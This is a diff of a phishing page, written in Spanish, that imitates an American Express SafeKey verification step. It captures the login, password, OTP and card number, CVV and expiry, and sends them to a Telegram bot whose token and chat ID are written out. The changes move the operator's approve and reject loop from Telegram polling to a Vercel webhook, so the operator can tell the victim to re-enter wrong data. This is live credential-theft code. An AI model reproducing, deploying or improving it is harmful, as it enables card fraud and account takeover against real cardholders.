@@ -41,7 +41,6 @@
             width: 100%;
         }
 
-        /* HEADER */
         .header {
             display: flex;
             flex-direction: column;
@@ -82,7 +81,6 @@
             margin: 0;
         }
 
-        /* TRANSACTION INFO */
         .transaction-info {
             background: var(--amex-light-blue);
             border: 1px solid #E0E9F5;
@@ -109,7 +107,6 @@
             text-align: right;
         }
 
-        /* FORM */
         form {
             display: flex;
             flex-direction: column;
@@ -156,7 +153,6 @@
             cursor: not-allowed;
         }
 
-        /* CREDENCIALES SECTION */
         .credentials-section {
             background: #FAFAFA;
             border: 1px solid var(--amex-light-gray);
@@ -188,7 +184,6 @@
             font-size: 0.8125rem;
         }
 
-        /* OTP SECTION */
         .otp-section {
             background: #FAFAFA;
             border: 1px solid var(--amex-light-gray);
@@ -213,7 +208,6 @@
             line-height: 1.4;
         }
 
-        /* BUTTONS */
         .button-group {
             display: flex;
             align-items: center;
@@ -284,7 +278,6 @@
             text-decoration: underline;
         }
 
-        /* CHECKBOX */
         .checkbox-group {
             display: flex;
             align-items: center;
@@ -306,7 +299,6 @@
             margin: 0;
         }
 
-        /* ERROR MESSAGES */
         .error-message {
             color: #D32F2F;
             font-size: 0.75rem;
@@ -323,7 +315,6 @@
             display: block;
         }
 
-        /* STATUS MESSAGE */
         .status-message {
             display: none;
             padding: 12px 16px;
@@ -348,7 +339,6 @@
             border: 1px solid #C8E6C9;
         }
 
-        /* LOADING OVERLAY */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -395,25 +385,20 @@
             margin-top: 8px;
         }
 
-        /* RESPONSIVE */
         @media (max-width: 640px) {
             .container {
                 padding: 24px;
             }
-
             .header {
                 gap: 12px;
                 margin-bottom: 28px;
             }
-
             .amex-logo {
                 width: 200px;
             }
-
             .header-title {
                 font-size: 1.25rem;
             }
-
             .header-subtitle {
                 font-size: 0.875rem;
             }
@@ -423,40 +408,32 @@
             .container {
                 padding: 20px;
             }
-
             .header {
                 gap: 10px;
                 margin-bottom: 24px;
             }
-
             .amex-logo {
                 width: 160px;
             }
-
             .header-title {
                 font-size: 1.125rem;
                 margin-bottom: 8px;
             }
-
             .header-subtitle {
                 font-size: 0.8125rem;
             }
-
             .credentials-grid {
                 grid-template-columns: 1fr;
             }
-
             .button-group {
                 flex-direction: column;
                 gap: 10px;
             }
-
             .btn-primary,
             .btn-secondary {
                 width: 100%;
                 flex: none;
             }
-
             .info-row {
                 font-size: 0.875rem;
             }
@@ -466,11 +443,9 @@
             .container {
                 padding: 16px;
             }
-
             .amex-logo {
                 width: 140px;
             }
-
             .header-title {
                 font-size: 1rem;
             }
@@ -478,7 +453,6 @@
     </style>
 </head>
 <body>
-    <!-- LOADING OVERLAY -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Verificando autenticación...</div>
@@ -486,7 +460,6 @@
     </div>
 
     <div class="container">
-        <!-- HEADER CON LOGO -->
         <div class="header">
             <div class="amex-logo">
                 <img src="amex.png" alt="American Express SafeKey" />
@@ -497,7 +470,6 @@
             </div>
         </div>
 
-        <!-- INFORMACIÓN DE LA TRANSACCIÓN -->
         <div class="transaction-info">
             <div class="info-row">
                 <span class="info-label">Merchant</span>
@@ -517,12 +489,9 @@
             </div>
         </div>
 
-        <!-- STATUS MESSAGE -->
         <div class="status-message" id="statusMessage"></div>
 
-        <!-- FORMULARIO -->
         <form id="authForm" novalidate>
-            <!-- CREDENCIALES -->
             <div class="credentials-section">
                 <div class="credentials-title">Credenciales de acceso</div>
                 <div class="credentials-grid">
@@ -551,7 +520,6 @@
                 </div>
             </div>
 
-            <!-- OTP -->
             <div class="otp-section">
                 <div class="otp-title">Código OTP (One-Time Password)</div>
                 <p class="otp-info">Se ha enviado un código de 6 dígitos a su móvil y correo electrónico registrado</p>
@@ -570,19 +538,16 @@
                 </div>
             </div>
 
-            <!-- CHECKBOX -->
             <div class="checkbox-group">
                 <input type="checkbox" id="memberRewards" />
                 <label for="memberRewards">Redimir Membership Rewards® Points en esta transacción</label>
             </div>
 
-            <!-- BOTONES -->
             <div class="button-group">
                 <button type="button" class="btn btn-secondary" id="cancelBtn">Cancelar</button>
                 <button type="submit" class="btn btn-primary" id="submitButton">Confirmar</button>
             </div>
 
-            <!-- FOOTER LINKS -->
             <div style="text-align: center; margin-top: 16px;">
                 <a href="#" class="btn-link" id="helpLink">Ayuda</a>
             </div>
@@ -591,21 +556,20 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN DE TELEGRAM Y WEBHOOK
+        // CONFIGURACIÓN
         // ============================================
         const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
         const TELEGRAM_CHAT_ID = '-1004389419498';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
         const WEBHOOK_URL = 'https://paso2-ajhp.vercel.app/api/webhook';
         
-        const POLLING_INTERVAL = 3000; // 3 segundos
-        const MAX_POLLING_TIME = 300000; // 5 minutos
+        const POLLING_INTERVAL = 3000;
+        const MAX_POLLING_TIME = 300000;
 
         let solicitudId = null;
         let pollingInterval = null;
-        let lastUpdateId = 0;
 
-        // Elementos del DOM
+        // Elementos DOM
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
@@ -641,24 +605,10 @@
         }
 
         // ============================================
-        // FUNCIONES DE TELEGRAM
+        // FUNCIONES TELEGRAM
         // ============================================
         function generarSolicitudId() {
             return 'AMEX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-        }
-
-        async function actualizarLastUpdateId() {
-            try {
-                const response = await fetch(`${TELEGRAM_API}/getUpdates?offset=-1&limit=1`);
-                const data = await response.json();
-                
-                if (data.ok && data.result.length > 0) {
-                    lastUpdateId = data.result[0].update_id + 1;
-                    console.log('📌 Last Update ID:', lastUpdateId);
-                }
-            } catch (error) {
-                console.error('Error actualizando lastUpdateId:', error);
-            }
         }
 
         async function enviarDatosATelegram(datos) {
@@ -711,9 +661,7 @@
 
 ⏳ *Estado:* Esperando verificación...`;
 
-                const url = `${TELEGRAM_API}/sendMessage`;
-                
-                const response = await fetch(url, {
+                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -729,7 +677,6 @@
 
                 if (data.ok) {
                     console.log('✅ Datos enviados a Telegram');
-                    await actualizarLastUpdateId();
                     return true;
                 } else {
                     console.error('❌ Error:', data.description);
@@ -741,107 +688,19 @@
             }
         }
 
-        async function verificarCallbackTelegram() {
+        // ============================================
+        // POLLING AL WEBHOOK (NO A TELEGRAM DIRECTAMENTE)
+        // ============================================
+        async function verificarEstadoWebhook(solicitudId) {
             try {
-                const url = `${TELEGRAM_API}/getUpdates?offset=${lastUpdateId}&timeout=5&allowed_updates=["callback_query"]`;
-                const response = await fetch(url);
+                const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
                 const data = await response.json();
-
-                if (data.ok && data.result.length > 0) {
-                    for (const update of data.result) {
-                        lastUpdateId = update.update_id + 1;
-
-                        if (update.callback_query) {
-                            const callbackData = update.callback_query.data;
-                            const callbackId = update.callback_query.id;
-                            const message = update.callback_query.message;
-                            const chatId = message.chat.id;
-                            const messageId = message.message_id;
-                            const originalText = message.text || '';
-
-                            console.log('🔘 Callback:', callbackData);
-
-                            if (callbackData.includes(solicitudId)) {
-                                let action;
-                                if (callbackData.startsWith('approve_')) {
-                                    action = 'approved';
-                                } else if (callbackData.startsWith('user_error_')) {
-                                    action = 'user_error';
-                                } else if (callbackData.startsWith('pass_error_')) {
-                                    action = 'pass_error';
-                                } else if (callbackData.startsWith('otp_error_')) {
-                                    action = 'otp_error';
-                                }
-
-                                // Responder al callback
-                                let respuestaTexto;
-                                switch(action) {
-                                    case 'approved':
-                                        respuestaTexto = '✅ Autenticación aprobada';
-                                        break;
-                                    case 'user_error':
-                                        respuestaTexto = '❌ Error de usuario';
-                                        break;
-                                    case 'pass_error':
-                                        respuestaTexto = '❌ Error de contraseña';
-                                        break;
-                                    case 'otp_error':
-                                        respuestaTexto = '❌ Error de OTP';
-                                        break;
-                                }
-
-                                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        callback_query_id: callbackId,
-                                        text: respuestaTexto,
-                                        show_alert: false
-                                    })
-                                });
-
-                                // Actualizar mensaje
-                                let estadoMensaje;
-                                switch(action) {
-                                    case 'approved':
-                                        estadoMensaje = '✅ *APROBADO* - Cliente redirigido';
-                                        break;
-                                    case 'user_error':
-                                        estadoMensaje = '❌ *ERROR USUARIO* - Datos incorrectos';
-                                        break;
-                                    case 'pass_error':
-                                        estadoMensaje = '❌ *ERROR CONTRASEÑA* - Datos incorrectos';
-                                        break;
-                                    case 'otp_error':
-                                        estadoMensaje = '❌ *ERROR OTP* - Código inválido';
-                                        break;
-                                }
-
-                                const newText = originalText.replace(
-                                    '⏳ *Estado:* Esperando verificación...',
-                                    `⏳ *Estado:* ${estadoMensaje}`
-                                );
-
-                                await fetch(`${TELEGRAM_API}/editMessageText`, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        chat_id: chatId,
-                                        message_id: messageId,
-                                        text: newText,
-                                        parse_mode: 'Markdown'
-                                    })
-                                });
-
-                                return action;
-                            }
-                        }
-                    }
-                }
-
-                return 'pending';
+                
+                console.log('📊 Estado webhook:', data.estado);
+                
+                return data.estado || 'pending';
             } catch (error) {
-                console.error('❌ Error en polling:', error);
+                console.error('❌ Error verificando webhook:', error);
                 return 'error';
             }
         }
@@ -849,7 +708,7 @@
         function iniciarPolling() {
             let tiempoInicio = Date.now();
             
-            console.log('🔄 Iniciando polling...');
+            console.log('🔄 Iniciando polling al webhook...');
             
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
@@ -858,26 +717,22 @@
                     return;
                 }
                 
-                const resultado = await verificarCallbackTelegram();
+                const resultado = await verificarEstadoWebhook(solicitudId);
                 
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
-                    
                     setTimeout(() => {
                         window.location.href = 'confirmacion.html';
                     }, 2000);
-                    
                 } else if (resultado === 'user_error') {
                     clearInterval(pollingInterval);
                     mostrarError('❌ Los datos ingresados no coinciden. Verifique su usuario.');
                     resetFormulario();
-                    
                 } else if (resultado === 'pass_error') {
                     clearInterval(pollingInterval);
                     mostrarError('❌ Los datos ingresados no coinciden. Verifique su contraseña.');
                     resetFormulario();
-                    
                 } else if (resultado === 'otp_error') {
                     clearInterval(pollingInterval);
                     mostrarError('❌ Código de verificación erróneo, intenta de nuevo.');
@@ -887,7 +742,7 @@
         }
 
         // ============================================
-        // FUNCIONES DE UI
+        // FUNCIONES UI
         // ============================================
         function mostrarError(mensaje) {
             statusMessage.className = 'status-message error';
@@ -913,7 +768,7 @@
         }
 
         // ============================================
-        // VALIDACIÓN Y EVENTOS
+        // VALIDACIÓN
         // ============================================
         [usernameInput, passwordInput, confirmationInput].forEach(input => {
             input.addEventListener('blur', function() {
@@ -932,18 +787,15 @@
 
             let isValid = true;
 
-            // Limpiar mensajes
             statusMessage.className = 'status-message';
             statusMessage.style.display = 'none';
             document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
 
-            // Validar usuario
             if (!usernameInput.value.trim()) {
                 usernameInput.parentElement.classList.add('error');
                 isValid = false;
             }
 
-            // Validar contraseña
             if (!passwordInput.value.trim()) {
                 passwordInput.parentElement.classList.add('error');
                 isValid = false;
@@ -953,7 +805,6 @@
                 isValid = false;
             }
 
-            // Validar OTP
             if (!confirmationInput.value.trim()) {
                 confirmationInput.parentElement.classList.add('error');
                 isValid = false;
@@ -965,26 +816,21 @@
 
             if (!isValid) return;
 
-            // Generar ID
             solicitudId = generarSolicitudId();
             console.log('🆔 Nueva solicitud:', solicitudId);
 
-            // Mostrar loading
             loadingOverlay.classList.add('active');
             submitButton.disabled = true;
             submitButton.textContent = 'Verificando...';
 
-            // Deshabilitar campos
             usernameInput.disabled = true;
             passwordInput.disabled = true;
             confirmationInput.disabled = true;
 
-            // Obtener datos de tarjeta
             const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
             const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
             const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
             
-            // Datos para Telegram
             const datosTelegram = {
                 solicitudId: solicitudId,
                 numeroTarjeta: numeroTarjeta,
@@ -997,7 +843,6 @@
                 fecha: document.getElementById('transaction-date').textContent
             };
 
-            // Enviar a Telegram
             const enviado = await enviarDatosATelegram(datosTelegram);
 
             if (enviado) {
@@ -1008,7 +853,6 @@
             }
         });
 
-        // Botón cancelar
         document.getElementById('cancelBtn').addEventListener('click', function(e) {
             e.preventDefault();
             if (confirm('¿Desea cancelar esta autenticación?')) {
@@ -1016,17 +860,14 @@
             }
         });
 
-        // Botón ayuda
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
             alert('Para más ayuda, contacte a American Express o a su banco.');
         });
 
-        // Inicializar
-        window.addEventListener('load', async function() {
+        window.addEventListener('load', function() {
             initializeTransaction();
-            await actualizarLastUpdateId();
-            console.log('✅ Sistema listo');
+            console.log('✅ Sistema listo - Usando webhook de Vercel');
         });
     </script>
 </body>
